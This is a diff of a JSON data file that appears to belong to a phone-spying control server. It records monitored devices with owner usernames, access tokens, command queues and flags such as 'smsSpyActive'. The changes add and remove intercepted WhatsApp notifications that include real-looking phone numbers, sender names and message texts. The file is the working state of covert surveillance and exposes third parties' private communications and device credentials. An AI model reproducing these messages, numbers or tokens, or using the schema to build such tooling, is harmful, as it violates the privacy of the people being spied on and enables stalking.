@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776917493991,
+    "lastSeen": 1776917497098,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Rafly",
+        "content": "kalo mau nunggu bang reno ini",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917497312
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917497231
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 40 chat",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917495675
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 878-9820-8741",
@@ -3995,30 +4019,6 @@
         "time": "23/04 09:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1776906670168
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎65 pesan dari 39 chat",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906669826
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 821-4849-9859",
-        "content": "Ok",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906669709
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎64 pesan dari 38 chat",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906668921
       }
     ],
     "galleryPhotos": [],
@@ -12426,7 +12426,7 @@
     "deviceName": "HP-AMBONV2-0FAF",
     "ownerUsername": "gehgtg17",
     "token": "7fbcd2650ba9cf5ce36f05d0004ee8a1",
-    "lastSeen": 1776917493997,
+    "lastSeen": 1776917496917,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T23:50:06.977Z",
